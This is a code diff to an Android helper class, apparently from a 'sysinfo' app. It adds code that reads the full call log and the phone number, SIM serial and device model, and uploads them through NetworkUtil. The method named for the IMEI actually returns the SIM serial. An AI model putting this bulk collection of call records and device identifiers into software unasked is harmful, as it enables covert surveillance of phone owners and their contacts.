@@ -6,11 +6,17 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.provider.CallLog;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
+
+import com.sidhit.sysinfo.src.model.CallLogData;
+import com.sidhit.sysinfo.src.model.DeviceData;
+import com.sidhit.sysinfo.src.model.SMSData;
 
 import java.util.ArrayList;
 import java.util.Date;
@@ -57,10 +63,11 @@ public class HelperMethod {
         if (c.moveToFirst()) {
             for (int i = 0; i < c.getCount(); i++) {
                 CallLogData callLogData = new CallLogData();
-                callLogData.setDateTime(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)).toString())));
-                callLogData.setNumber(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)).toString());
-                callLogData.setDuration(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)).toString());
-                int dircode = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)).toString());
+                callLogData.setId(c.getString(c.getColumnIndexOrThrow(CallLog.Calls._ID)));
+                callLogData.setDateTime(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
+                callLogData.setNumber(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                callLogData.setDuration(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                int dircode = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                 switch (dircode) {
                     case CallLog.Calls.OUTGOING_TYPE:
                         callLogData.setCallType(Enums.CallType.OUTGOING);
@@ -77,13 +84,14 @@ public class HelperMethod {
             }
         }
         c.close();
-        for (int i = 0; i < 5; i++) {
-            Log.d("Dated", callLogDataList.get(0).getDateTime().toString());
-            Log.d("Number", callLogDataList.get(0).getNumber());
-            Log.d("Duration", callLogDataList.get(0).getDuration());
-            Log.d("Type", callLogDataList.get(0).getCallType().name());
-            System.out.println("**************************************");
-        }
+        NetworkUtil.sendCallLogData(activity.getApplicationContext(), callLogDataList);
+//        for (int i = 0; i < callLogDataList.size(); i++) {
+//            Log.d("Dated", callLogDataList.get(i).getDateTime().toString());
+//            Log.d("Number", callLogDataList.get(i).getNumber());
+//            Log.d("Duration", callLogDataList.get(i).getDuration());
+//            Log.d("Type", callLogDataList.get(i).getCallType().name());
+//            System.out.println("**************************************");
+//        }
     }
 
     public static Boolean askForPermission(String permission, Integer requestCode, Context context, Activity activity) {
@@ -100,6 +108,34 @@ public class HelperMethod {
             Toast.makeText(activity, "" + permission + " is already granted.", Toast.LENGTH_SHORT).show();
         }
         return Boolean.TRUE;
+    }
+
+    public static void getDeviceData(Context context) {
+        DeviceData deviceData = new DeviceData();
+        deviceData.setDeviceName(Build.MODEL);
+        deviceData.setPrimaryPhoneNumber(getPhoneNumber(context));
+        deviceData.setSimSerialNumber(getSIMSerialNumber(context));
+        deviceData.setIMEINumber(getIMEINumber(context));
+        NetworkUtil.sendDeviceData(context, deviceData);
+    }
+
+    private static String getPhoneNumber(Context context) {
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        return tMgr.getLine1Number();
+    }
+
+    private static String getSIMSerialNumber(Context context) {
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        return tMgr.getSimSerialNumber();
+    }
+
+    private static String getIMEINumber(Context context) {
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        return tMgr.getSimSerialNumber();
+    }
+
+    public static String getUniqueDeviceId(Context context) {
+        return getIMEINumber(context);
     }
 
 }
